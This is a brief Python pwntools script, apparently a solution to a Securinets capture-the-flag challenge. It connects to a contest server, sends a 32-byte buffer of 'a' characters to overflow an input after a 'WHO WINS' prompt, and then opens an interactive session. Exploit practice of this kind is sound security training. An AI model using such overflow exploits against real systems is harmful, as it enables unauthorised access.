from pwn import *

io = remote("pwn.friendly.securinets.tn", 5006)


io.sendlineafter(b'you vs the beef !!!! WHO WINS ?\n', b'a'*(16+16))

io.interactive()